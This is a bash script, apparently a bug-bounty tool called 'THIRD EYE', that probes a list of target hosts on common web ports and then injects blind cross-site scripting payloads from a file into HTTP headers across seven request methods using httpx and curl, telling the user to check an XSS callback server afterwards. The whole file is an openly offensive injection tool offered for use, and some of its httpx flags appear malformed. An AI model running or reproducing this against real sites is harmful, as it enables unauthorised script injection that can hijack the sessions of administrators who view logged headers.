#!/bin/bash

R='\033[0;31m'
G='\033[0;32m'
O='\033[0;33m'
E='\033[0m'

headers_file=user-agent
payloads_file=blind
urls_file=urls
read -p "Enter Path of Urls: " sub
figlet -f big "THIRD EYE" | lolcat
echo -e "${O}[+] 🔱 Har Har Mahadev 🔱 [+]${E}"
sleep 2
echo ""
echo -e "${R}[+] ${G}Running httprobe on targets.......${E}\n"
cat $sub | httprobe -p http:81 -p http:80 -p http:443 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -p https:10000 -p http:9000 -p https:9443 -c 50 | tee urls
echo ""
echo -e "${R}[-] ${O}Starting Blind XSS Scanning.......${E}\n"
sleep 1
while IFS= read -r header; do
    while IFS= read -r payload; do
        while IFS= read -r url; do
        #Using httpx
            echo -e "${R} [+]${E} ${G} $header ${E} ${R}[+]${E}"
            echo -e "${R} [+]${E} ${G} Payload:${E} $payload ${R}[+]${E}"
            GET=$(httpx -u $url --silent -sc -H -method -x GET "$header: $payload")
            echo -e "${R} [+] Method:GET [+]${E} ${O} $GET ${E}"
            POST=$(httpx -u $url --silent -sc -method POST -H "$header: $payload")
            echo -e "${R} [+] Method:POST [+]${E} ${O} $POST ${E}"
            OPTIONS=$(httpx -u $url --silent -sc -method -x OPTIONS -H "$header: $payload")
            echo -e "${R} [+] Method:OPTIONS [+]${E} ${O} $OPTIONS ${E}"
            PATCH=$(httpx -u $url --silent -sc -method -x PATCH -H "$header: $payload")
            echo -e "${R} [+] Method:PATCH [+]${E} ${O} $PATCH ${E}"
            CONNECT=$(httpx -u $url --silent -sc -method -x CONNECT -H "$header: $payload")
            echo -e "${R} [+] Method:CONNECT [+]${E} ${O} $CONNECT ${E}"
            TRACE=$(httpx -u $url --silent -sc -method -x TRACE -H "$header: $payload")
            echo -e "${R} [+] Method:TRACE [+]${E} ${O} $TRACE ${E}"
            PUT=$(httpx -u $url --silent -sc -method -x PUT -H "$header: $payload")
            echo -e "${R} [+] Method:PUT [+]${E} ${O} $PUT ${E}"
            #Using Curl
            GET2=$(curl -s -X "GET" --silent -I --path-as-is --insecure $url -H "$header: $payload" | grep HTTP)
            echo -e "${R} [+] Curl:GET [+]${E} ${O} $GET2 ${E}"
            POST2=$(curl -s -X "POST" --silent -I --path-as-is --insecure $url -H "$header: $payload" | grep HTTP)
            echo -e "${R} [+] Curl:POST [+]${E} ${O} $POST2 ${E}"
            OPTIONS2=$(curl -s -X "OPTIONS" --silent -I --path-as-is --insecure $url -H "$header: $payload" | grep HTTP)
            echo -e "${R} [+] Curl:OPTIONS [+]${E} ${O} $OPTIONS2 ${E}"
            PATCH2=$(curl -s -X "PATCH" --silent -I --path-as-is --insecure $url -H "$header: $payload" | grep HTTP)
            echo -e "${R} [+] Curl:PATCH [+]${E} ${O} $PATCH2 ${E}"
            CONNECT2=$(curl -s -X "CONNECT" --silent -I --path-as-is --insecure $url -H "$header: $payload" | grep HTTP)
            echo -e "${R} [+] Curl:CONNECT [+]${E} ${O} $CONNECT2 ${E}"
            TRACE2=$(curl -s -X "TRACE" --silent -I --path-as-is --insecure $url -H "$header: $payload" | grep HTTP)
            echo -e "${R} [+] Curl:TRACE [+]${E} ${O} $TRACE2 ${E}"
            PUT2=$(curl -s -X "PUT" --silent -I --path-as-is --insecure $url -H "$header: $payload" | grep HTTP)
            echo -e "${R} [+] Curl:PUT [+]${E} ${O} $PUT2 ${E}\n"

        done < "$urls_file"
    done < "$payloads_file"
done < "$headers_file"
echo -e "${O}[+] Scanning Completed Check XSS server [+]${E}"
